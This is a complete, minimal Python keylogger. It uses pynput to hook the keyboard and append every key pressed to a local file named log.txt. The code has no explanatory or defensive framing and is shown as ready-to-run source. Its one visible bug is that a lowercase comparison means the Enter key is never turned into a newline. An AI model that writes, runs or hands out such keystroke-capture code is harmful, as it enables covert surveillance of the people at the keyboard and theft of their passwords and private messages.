#!/usr/bin/env python3
import pynput
import pynput.keyboard
def file(key):
    word=str(key)
    word=word.replace("'","")
    if(word=="key.enter"):
        word="\n"
    with open(r"log.txt" , 'a') as f:
        f.write(word)
with pynput.keyboard.Listener(on_press=file) as l:
    l.join()